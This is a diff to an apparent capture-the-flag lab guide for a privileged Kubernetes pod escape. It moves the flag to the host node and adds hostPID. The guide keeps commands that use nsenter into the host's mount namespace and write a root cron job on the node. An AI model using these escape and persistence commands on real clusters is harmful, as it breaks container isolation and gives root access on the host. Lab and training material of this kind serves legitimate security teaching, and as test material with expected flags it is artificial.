@@ -24,11 +24,11 @@
 | Difficulty | L2 |
 | Type | k8s (KIND cluster) |
 | Cluster Name | cve-k8s-11-privileged |
-| Flag Location | `/host-flag/flag.txt` on KIND node, mounted into pod at `/host-flag` |
+| Flag Location | `/host-flag/flag.txt` on the KIND node (not mounted into the pod; host access required) |
 
 ## Attack Path Summary
 1. Pod `privileged-pod` runs with `privileged: true` (all capabilities, no isolation)
-2. The pod has a hostPath volume mounting `/host-flag` from the KIND node
+2. The pod also runs with `hostPID: true`
 3. Use `nsenter` to enter the host namespace and read the flag
 4. Alternative: mount the host filesystem and read the flag directly
 
@@ -101,23 +101,10 @@ cp /tmp/cronjob /etc/cron.d/flag-job 2>/dev/null || \
 nsenter --target 1 --mount -- sh -c "echo '* * * * * root cat /host-flag/flag.txt > /tmp/flag_out' > /etc/cron.d/flag-job"
 ```
 
-### Step 6: Direct Flag Access
-Since the flag is mounted via hostPath at `/host-flag`, it's directly accessible:
-
-```bash
-# The flag is mounted directly in the pod at /host-flag/
-cat /host-flag/flag.txt
-# Expected: flag{k8s-11-*}
-
-# If not, use nsenter
-nsenter --target 1 --mount -- cat /host-flag/flag.txt
-```
-
-### Step 7: Capture Flag
+### Step 6: Capture Flag
 - Flag format: `flag{k8s-11-*}`
-- Flag location: `/host-flag/flag.txt` on the KIND node, mounted into pod at `/host-flag`
+- Flag location: `/host-flag/flag.txt` on the KIND node (reachable only from the host namespace)
 - Access methods:
-  - Direct: `cat /host-flag/flag.txt` (if mounted)
   - nsenter: `nsenter --target 1 --mount -- cat /host-flag/flag.txt`
 - Expected output: `flag{k8s-11-default}` (or custom value from `CVE_FLAG`)
 
